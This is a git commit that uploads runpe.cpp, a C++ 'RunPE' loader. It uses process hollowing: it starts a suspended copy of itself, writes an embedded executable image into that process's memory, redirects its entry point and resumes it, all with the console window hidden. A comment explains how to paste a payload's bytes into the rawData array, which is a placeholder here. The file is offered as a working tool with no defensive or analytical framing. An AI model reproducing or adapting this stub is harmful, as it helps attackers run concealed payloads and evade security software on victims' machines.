7ce8b81e70f29ae3841692fdebfcdb38ffadf833
userxor <119485262+userxor@users.noreply.github.com>
2022-12-01 08:35:38 +0330

    Add files via upload

---
+++ runpe.cpp
@@ -0,0 +1,82 @@
+﻿//to use this program go to end of linethis code . open HxDen click edit,copy as c and replase it with unsigned char rawdata
+#include "stdafx.h"
+#include <fstream>
+#include <conio.h>
+#include <iostream>
+#include <string>
+#include <Windows.h>
+#include <TlHelp32.h>
+HANDLE MapFileToMemory(LPCSTR filename)
+{
+	std::streampos size;
+	std::fstream file(filename, std::ios::in | std::ios::binary | std::ios::ate);
+	if (file.is_open())
+	{
+		size = file.tellg();
+		char* Memblock = new char[size]();
+		file.seekg(0, std::ios::beg);
+		file.read(Memblock, size);
+		file.close();
+		return Memblock;
+	}
+	return 0;
+}
+int RunPortableExecutable(void* Image)
+{
+	IMAGE_DOS_HEADER* DOSHeader;
+	IMAGE_NT_HEADERS* NtHeader;
+	IMAGE_SECTION_HEADER* SectionHeader;
+	PROCESS_INFORMATION PI;
+	STARTUPINFOA SI;
+	CONTEXT* CTX;
+	DWORD* ImageBase;
+	void* pImageBase;
+	int count;
+	char CurrentFilePath[1024];
+	DOSHeader = PIMAGE_DOS_HEADER(Image);
+	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
+	GetModuleFileNameA(0, CurrentFilePath, 1024);
+	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
+	{
+		ZeroMemory(&PI, sizeof(PI));
+		ZeroMemory(&SI, sizeof(SI));
+		if (CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE,
+			CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
+		{
+			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
+			CTX->ContextFlags = CONTEXT_FULL;
+			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
+			{
+				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
+				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase),
+					NtHeader->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
+				WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
+				for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
+				{
+					SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
+					WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
+						LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
+				}
+				WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
+					LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
+				CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
+				SetThreadContext(PI.hThread, LPCONTEXT(CTX));
+				ResumeThread(PI.hThread);
+				return 0;
+			}
+		}
+	}
+}
+// enter valid bytes of a program here.
+unsigned char rawData[1000] = {
+	0x00, 0x00, 0x00
+};
+int _tmain(int argc, _TCHAR* argv[])
+{
+	HWND hwND = GetConsoleWindow();
+	ShowWindow(hwND, SW_HIDE);
+	RunPortableExecutable(rawData);
+	getchar();
+	_getche();
+	return 0;
+}
